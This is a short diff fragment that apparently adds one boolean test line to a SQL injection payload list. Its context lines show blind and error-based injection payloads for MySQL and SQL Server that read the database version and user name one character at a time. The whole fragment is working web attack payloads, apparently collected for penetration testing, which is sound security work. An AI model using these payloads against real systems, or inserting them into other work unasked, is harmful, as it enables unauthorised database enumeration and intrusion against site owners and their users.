@@ -62,6 +62,7 @@ Integer
 [IF ERRORS RETURNED]: (SELECT CASE WHEN convert(int,(SELECT @@version))=1 THEN 1 ELSE 2 END)
 
 Integer MySQL
+(Select case when 1=1 then 1 else 6 END)
 (SELECT CASE WHEN SUBSTRING(user(), 1, 1)='n' THEN 1 ELSE 9 END)-- -
 (SELECT IF(SUBSTRING(@@version, 1, 1)='5',1,2))
 't' OR (SELECT CASE WHEN substring(user() ,1,1)='n' THEN 1 ELSE 'error' END)
